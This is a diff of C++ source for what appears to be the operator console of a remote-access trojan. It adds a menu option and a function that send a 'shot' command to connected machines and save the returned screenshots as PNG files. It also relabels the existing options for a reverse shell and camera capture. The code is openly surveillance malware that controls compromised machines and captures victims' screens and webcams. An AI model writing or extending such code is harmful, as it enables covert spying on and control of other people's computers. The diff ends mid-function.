@@ -24,11 +24,24 @@ int Menu::printRevShells(Communication* communication) {
     return count;
 }
 
+int Menu::printScreens(Communication* communication) {
+    int count = 0;
+    cout << "Active Screens: " << endl;
+    map<unsigned int, tuple<SOCKET, string>> rev_shells = communication->getScreens();
+    for (auto shell = rev_shells.begin(); shell != rev_shells.end(); ++shell) {
+        cout << get<1>(shell->second) << " - " << shell->first << endl;
+        count++;
+    }
+
+    return count;
+}
+
 int Menu::printOptions() {
 	int op;
 	cout << "Options: " << endl;
-	cout << "[1] shell by id" << endl;
-	cout << "[2] camera by id" << endl;
+	cout << "[1] rev shell" << endl;
+	cout << "[2] camera" << endl;
+    cout << "[3] screen" << endl;
 	cout << "[0] exit" << endl;
 	cout << ">> ";
 	cin >> op;
@@ -98,6 +111,49 @@ void Menu::sendCameraByID(Communication* communication, unsigned int id) {
         while (true) {
             bytesReceived = recv(socket, buffer, 1024, 0);
             end = buffer+4;
+            end = end.substr(0, 3);
+            if (end == "end") {
+                break;
+            }
+            outFile.write(buffer, bytesReceived);
+        }
+
+        if (bytesReceived == SOCKET_ERROR) {
+            throw std::runtime_error("Communication::cameraHandler() - recv");
+        }
+
+        outFile.close();
+        i++;
+    }
+    catch (const std::exception& e) {
+        std::cerr << "Error: " << e.what() << std::endl;
+    }
+}
+
+void Menu::sendScreenByID(Communication* communication, unsigned int id) {
+    static int i = 0;
+    string data = "shot";
+    string file_name = "screen_";
+    string end = "";
+    SOCKET socket = get<0>(communication->getScreens()[id]);
+
+    try {
+        send(socket, data.c_str(), data.size(), 0);
+
+        std::ofstream outFile;
+        file_name += std::to_string(i) + ".png";
+        outFile.open(file_name, std::ios::binary | std::ios::out);
+
+        if (!outFile.is_open()) {
+            throw std::runtime_error("Failed to open file");
+        }
+
+        char buffer[1024] = { 0 };
+        int bytesReceived = 0;
+        end = "";
+        while (true) {
+            bytesReceived = recv(socket, buffer, 1024, 0);
+            end = buffer + 4;
             end = end.substr(0, 3);
             if (end == "end") {
                 break;
